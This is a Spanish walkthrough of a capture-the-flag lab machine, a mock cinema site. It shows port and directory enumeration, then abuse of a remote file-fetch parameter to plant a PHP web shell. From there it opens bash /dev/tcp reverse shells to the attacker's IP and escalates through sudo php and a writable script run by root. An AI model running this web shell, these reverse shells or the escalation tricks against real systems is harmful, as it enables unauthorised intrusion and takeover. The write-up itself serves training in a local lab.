## INICIAMOS DOCKER Y COMPROBAMOS TRAZABILIDAD

Descargamos el archivo zip de la máquina:
```
https://mega.nz/file/qQElkZ5K#Buv0R6SQBuj_ZImKWIks80BxwhDMyJVtYEZVXP3M9Xw
```
descomprimimos el archivo:
```bash
unzip cinehack.zip
```
eliminamos el zip por limpieza
```bash
rm cinehack.zip
```
*LEVANTAMOS EL DOCKER*
```BASH
sudo bash auto_deploy.sh cinehack.tar
```
Una vez levantado comprobamos si tenemos conexión con el docker:
```bash
 ping -c 1 172.17.0.2
```
```                                                                                                                                                               
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.054 ms

--- 172.17.0.2 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.054/0.054/0.054/0.000 ms
```

## FASE DE ENUMERACIÓN

En esta fase vamos a recopilar toda la información que podamos para vulnerar la máquina, 
empezamos con un escaneo de los puertos que tiene abiertos para ver que servicios corren
en ellos y su versión por si tienen alguna vulnerabilidad.

con nmap vamos a realizar el escaneo:
```bash
sudo nmap -sS -sCV -Pn --min-rate 5000 -p- -vvv --open 172.17.0.2 -oN PuertosYservicios
```
*Explicación:*
Opciones del Comando
sudo: Ejecuta el comando con privilegios de administrador (necesario para realizar escaneos completos y efectivos).

nmap: Llama a la herramienta Nmap.

-sS: Realiza un escaneo SYN stealth. Este método es rápido y discreto, ideal para evitar detección en sistemas de monitoreo.

-sCV:

-sC: Utiliza scripts de detección estándar para identificar servicios y posibles vulnerabilidades.
-sV: Detecta las versiones de los servicios que se ejecutan en los puertos abiertos.
-Pn: Desactiva la detección de hosts activos (ping). Supone que el host está activo incluso si no responde a un ping.

--min-rate 5000: Establece un mínimo de 5000 paquetes por segundo. Esto acelera el escaneo.

-p-: Escanea todos los puertos (0-65535), en lugar de solo los más comunes.

-vvv: Muestra salida en modo muy detallado, proporcionando información adicional sobre el progreso.

--open: Solo muestra los puertos que están abiertos.

172.17.0.2: IP del objetivo a escanear.

-oN PuertosYservicios: Guarda los resultados en un archivo llamado PuertosYservicios en formato legible por humanos.

*Tenemos esta salida:*
```
PORT   STATE SERVICE REASON         VERSION
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.58 ((Ubuntu))
|_http-title: Cine Profesional
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-server-header: Apache/2.4.58 (Ubuntu)
MAC Address: 02:42:AC:11:00:02 (Unknown)
```
puerto 80 con el servicio http donde corre apache en version 2.4.58  (no vulnerable)

pues con un puerto y no vulnerable nos vamos a investigar la página web.

*USO DE WHATWEB*
```bash
 whatweb http://172.17.0.2 | tee whatweb
```
whatweb:

Es la herramienta principal. Realiza un escaneo en la URL proporcionada para identificar tecnologías asociadas al sitio web, como:
Servidor web (Apache, Nginx, etc.).
Sistema de gestión de contenidos (WordPress, Joomla, etc.).
Frameworks o librerías (jQuery, React, etc.).
Cookies y configuraciones de seguridad.

http://172.17.0.2:

Es la URL objetivo que se desea analizar. En este caso, es una dirección IP local de red.


| (pipe):

El símbolo pipe se usa para redirigir la salida de un comando como entrada de otro. Aquí, redirige la salida del escaneo de whatweb hacia el siguiente comando (tee).
tee whatweb:

tee: Muestra la salida del comando en pantalla y la guarda en un archivo.
En este caso, la salida del escaneo se guarda en un archivo llamado whatweb (que no es la herramienta sino un archivo para poder consultar)

En este caso no nos reporta nada interesante

```
whatweb http://172.17.0.2 | tee whatweb                                                                                                                                       
http://172.17.0.2 [200 OK] Apache[2.4.58], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.58 (Ubuntu)], IP[172.17.0.2], Title[Bienvenido a Cinema DL]
```
 solo nos queda abrir la página y ver que nos encontramos.

 me entran sospechas de que estemos ante un virtual hosting así que añado al /etc/hosts en dominio cinema.dl

 ```bash
 sudo nano /etc/hosts
```
con ctrl+o guardo los cambios y con ctrl+x cierro
añado esta linea
```
172.17.0.2      cinema.dl
```
y compruebo ahra en el navegador si nos abre la misma pagina que con la ip 
```
http://cinema.dl/
```

y no, es otra página diferente. 
por defecto miramos el código fuente de la página en mozilla que es lo que uso es ctrl+u
y no vemos nada interesante.
hacemos un pequeó fuzzing para ver si hay alguna ruta interesante:
```bash
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 'http://cinema.dl' -x php,html,js  | tee rutas
```
*Explicación:*
1 gobuster dir

Ejecuta Gobuster en modo escaneo de directorios y archivos. Este modo busca directorios o archivos en el servidor objetivo.
2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

Especifica la wordlist que Gobuster usará para descubrir directorios y archivos.
En este caso, se usa una lista común ubicada en /usr/share/wordlists/dirbuster.
3 -u 'http://cinema.dl'

Define la URL objetivo a escanear, en este caso, el dominio 'http://cinema.dl'.
4 -x php,html,js

Busca archivos con extensiones específicas:
.php (archivos PHP)
.html (archivos HTML)
.js (archivos JavaScript)

5 | tee rutas

El operador | redirige la salida de Gobuster a tee.
tee rutas guarda la salida del comando en un archivo llamado rutas, mientras la muestra en pantalla.

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://cinema.dl
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              js,php,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 7502]
/reservation.php      (Status: 200) [Size: 1779]
/.html                (Status: 403) [Size: 274]
/.php                 (Status: 403) [Size: 274]
/server-status        (Status: 403) [Size: 274]
Progress: 882184 / 882188 (100.00%)
```
ahora intentamos clicar alguna pelicula para ver como se comporta la página y solo deja acceder a una
"El tiempo que tenemos" y nos lleva a una especie de reserva.
```
http://cinema.dl/reserva.html
```
miramos el códigofuente con ctrl+u y vemos esto:
```
 reserveButton.addEventListener('click', (e) => {
                e.preventDefault();  // Prevent default action for confirmation

                if (selectedSeats.length > 0) {
                    // Llenar los campos del formulario en el popup con los datos de la reserva
                    const problemUrl = 'http://tusitio.com/uploads/webshell.php'; // URL maliciosa
                    document.getElementById('problem_url').value = problemUrl;

                    // Aquí puedes agregar más información como el nombre o correo si es necesario
                    // Ejemplo (se puede modificar según lo que desees pasar):
                    document.getElementById('name').value = "Juan Pérez"; 
                    document.getElementById('email').value = "juanperez@example.com";
                    document.getElementById('phone').value = "+34 600 123 456";

                    popup.style.display = 'flex'; // Mostrar el popup
                } else {
                    alert('Por favor, selecciona al menos una butaca para reservar.');
                }
```

esta parte es muy interesante:
```
 // Llenar los campos del formulario en el popup con los datos de la reserva
                    const problemUrl = 'http://tusitio.com/uploads/webshell.php'; // URL maliciosa
```
hay una parte del formulario donde podemos inyectar una url maliciosa para que descargue algo de ella

hacemos una reserva y con burpsuite capturamos la petición

```
POST /reservation.php HTTP/1.1

Host: cinema.dl

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3

Accept-Encoding: gzip, deflate, br

Content-Type: application/x-www-form-urlencoded

Content-Length: 123

Origin: http://cinema.dl

DNT: 1

Connection: close

Referer: http://cinema.dl/reserva.html

Upgrade-Insecure-Requests: 1



name=pepito+grillo&email=grillo%40example.com&phone=123456789&problem_url=http%3A%2F%2Ftusitio.com%2Fuploads%2Fwebshell.php
```
la mandamos al repeater y vamos a ver que podemos hacer

para trabajar más limpio dejo así la peticion en la parte de los datos:
```
name=pepito+grillo

&email=grillo%40example.com

&phone=123456789

&problem_url=http%3A%2F%2Ftusitio.com%2Fuploads%2Fwebshell.php
```

ahí tenemos problen_url, vamos a hacernos una petición de un archivo y vemos que pasa

mi ip en docker es 172.17.0.1

monto un servidor con python:
```bash
sudo python3 -m http.server 80
```
y hago una petición a mi ip de unarchivo que no existe:
```
http://172.17.0.1/noexisto.php
```
que encodeado me queda así:
```
http%3A%2F%2F172.17.0.1%2Fnoexisto.php
```
hago la petición porburpsuite quedando así la data:

```
name=pepito+grillo

&email=grillo%40example.com

&phone=123456789

&problem_url=http%3A%2F%2F172.17.0.1%2Fnoexisto.php
```
no obtengo la petición a mi servidor python
asique modifico esta vez en la url ya que ponía que era una constante
```
POST /reservation.php?problem_url=http%3A%2F%2F172.17.0.1%2Fnoexisto.php
```

y ahora si recibo la petición a mi servidor:
```
sudo python3 -m http.server 80                                                                                                                                                
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
172.17.0.2 - - [21/Jan/2025 14:22:58] code 404, message File not found
172.17.0.2 - - [21/Jan/2025 14:22:58] "GET /noexisto.php HTTP/1.1" 404 -
```
pues voy a subir un archivo malicioso, creo uno con este contenido:

```bash
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
<script>document.getElementById("cmd").focus();</script>
</html>
```
y lo llamo shell.php,y lo alojo en la carpeta donde levanté el servido python hago la petición quedando así:
```
POST /reservation.php?problem_url=http%3A%2F%2F172.17.0.1%2Fshell.php HTTP/1.1
```
```
sudo python3 -m http.server 80                                                                                                                                                          
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
172.17.0.2 - - [21/Jan/2025 14:26:59] "GET /shell.php HTTP/1.1" 200 -
```
muy bien ya tengo la shell maliciosa en la web...pero no se donde se ha subido.

hago fuzzing con bastantes diccionarios y no encuentro dónde se ha subido así que pruebo a hacer un diccionario
personalizado:
primero intento con:
```bash
cewl http://cinema.dl/reserva.html -w password.txt
```
sin resultado, desquiciado pruebo con los nombres de los actores:
```
andrewgarfield
florencepugh
leonardodicaprio
scarlettjohansson
denzelwashington
natalieportman
robertdowneyjr
annehathaway
chrishemsworth
jenniferlawrence
tomhanks
emmastone
michaelbjordan
margotrobbie
christianbale
zoesaldana
ryanreynolds
merylstreep
hughjackman
gracedelaney
```
he dejado una lista corta y hago fuzzing de nuevo
```
gobuster dir  -u 'http://cinema.dl' -w actores   | tee rutas                                                                                                                       
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://cinema.dl
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                actores
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/andrewgarfield       (Status: 301) [Size: 315] [--> http://cinema.dl/andrewgarfield/]
Progress: 20 / 21 (95.24%)
===============================================================
Finished
```
## FASE INTRUSIÓN:

vamos a lo que nos ha encontrado:
http://cinema.dl/andrewgarfield/
y vemos ahí nuestra shell.php

con EL código QUE METIMOS nos aparece una ventania en la que podemos ejecutar comandos, vamos a:
```
http://cinema.dl/andrewgarfield/shell.php
```
e introduciomos "id"
 ```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
si no os funciona podeis incrustar la consulta en:
```
http://cinema.dl/andrewgarfield/shell.php?cmd=id
```
o hacer un curl:
```bash
curl "http://cinema.dl/andrewgarfield/shell.php?cmd=id"
```
```                                                                                                                   
<html>
<body>
<form method="GET" name="shell2.php">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
uid=33(www-data) gid=33(www-data) groups=33(www-data)
</pre>
</body>
<script>document.getElementById("cmd").focus();</script>
</html>
```

pues nos ponemos a la escucha en el puerto 445:
```bash
sudo nc -lvnp 445
```
y nos enviamos una revershell:
```
bash -c "bash -i >& /dev/tcp/172.17.0.1/445 0>&1"
```
que encodeado queda así:
```bash
bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.17.0.1%2F445%200%3E%261%22
```

yo lo hice desde curl:
```bash
curl "http://cinema.dl/andrewgarfield/shell2.php?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.17.0.1%2F445%200%3E%261%22"
```

pero funciona igual desde el recuadro o la URL

* Ya estamos dentro *

  Hacemos un tratamiento de la TTY:
  
```bash
export TERM=xterm
export SHELL=bash
script /dev/null -c bash 
^Z
stty raw -echo; fg
reset xterm
stty rows 51 columns 237
```

ahora es la metodología que tenga cada cual yo empiezo por "id" no siendo que estemos en algún grupo con privilegios:
```
www-data@dockerlabs:/var/www/cinema.dl/andrewgarfield$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
nada, pruebo a ver la variable de entorno, he llegado a ver credenciales ahí en texto claro:
```
www-data@dockerlabs:/var/www/cinema.dl/andrewgarfield$ printenv
SHELL=bash
PWD=/var/www/cinema.dl/andrewgarfield
APACHE_LOG_DIR=/var/log/apache2
LANG=C
APACHE_PID_FILE=/var/run/apache2/apache2.pid
TERM=xterm
APACHE_RUN_GROUP=www-data
APACHE_LOCK_DIR=/var/lock/apache2
SHLVL=3
APACHE_RUN_DIR=/var/run/apache2
APACHE_RUN_USER=www-data
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
_=/usr/bin/printenv
```
nada, lo siguiente es ver si tenemos algún privilegio con sudo -l y si no hay nada buscar permisos SUID o capabiliy
```
www-data@dockerlabs:/var/www/cinema.dl/andrewgarfield$ sudo -l
Matching Defaults entries for www-data on dockerlabs:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User www-data may run the following commands on dockerlabs:
    (boss) NOPASSWD: /bin/php
```
vale podemos ejecutar php como el usuario boss, vamos a ver los usuarios del sistema:
```bash
 cat /etc/passwd | grep sh$
```
```
root:x:0:0:root:/root:/bin/bash
boss:x:1001:1001:boss,,,:/home/boss:/bin/bash
```

pues boss y ya root, esto pinta bien, vamos a nuestra página de explotación de binarios:
```bash
https://gtfobins.github.io/
```
y buscamos php para sudo:
```bash
CMD="/bin/sh"
sudo php -r "system('$CMD');"
```
vamos a adecuarlo un poco mejor :
```bash
sudo -u boss /bin/php -r "system('/bin/bash');"
```
todo perfecto y... nos saca a patadas!!!!!
pues a las bravas, me voy a un directorio donde puedra escribir y ya que nano también me da problemas con "echo" meto 
contenido en un archivo:
```bash
echo 'bash -i >& /dev/tcp/172.17.0.1/446 0>&1' > rev.sh
```
doy permisos de ejecución:
```bash
chmod +x rev.sh
```
me pongo a la escucha en el puerto 446:
```bash
sudo nc -lvnp 446
```
y ahora ejecuto el comando haciendo que ejecute el archivo como el usuario boss:
```bash
sudo -u boss /bin/php -r "system('bash /tmp/rev.sh');"
```
y ay somos usuario boss, hago tratamiento de la TTY:
```bash
export TERM=xterm
export SHELL=bash
script /dev/null -c bash 
^Z
stty raw -echo; fg
reset xterm
stty rows 51 columns 237
```
Después de mirar si tenemos alguna clase de privilegio, no encuentro nada, miro los procesos que se ejecutan:
```bash
ps aux
```
y veo algo interesante:
```
/bin/sh -c service apache2 start && service cron start && while true; do /var/spool/cron/crontabs/root.sh; sleep 60; done
```
ejecuta en bucle /var/spool/cron/crontabs/root.sh y para el bucle 60 segundos antes de volver a ejecutarlo
```bash
ls -la /var/spool/cron/crontabs/root.sh
```
```
-rwxr-xr-x 1 root crontab 1186 Jan 16 13:02 /var/spool/cron/crontabs/root.sh
```
puedo al menos leer lo que hay y veo que ejecuta dos cosas:
```
/opt/update.sh
/tmp/script.sh
```
pues... me voy a /tmp y no existe el script, voy a hacer uno que me convenga jeje:
 ```bash
echo -e '#!/bin/bash\n\nchmod u+s /bin/bash' > script.sh
```
doy permisos de ejecucion:
```bash
chmod +x script.sh
```

redoble de tambor:
```
ls -la /bin/bash
ls -la /bin/bash
-rwsr-xr-x 1 root root 1446024 Mar 31  2024 /bin/bash
```
ya tiene el bit SUID así pues:
```bash
/bin/bash -p
```
ya somos root.



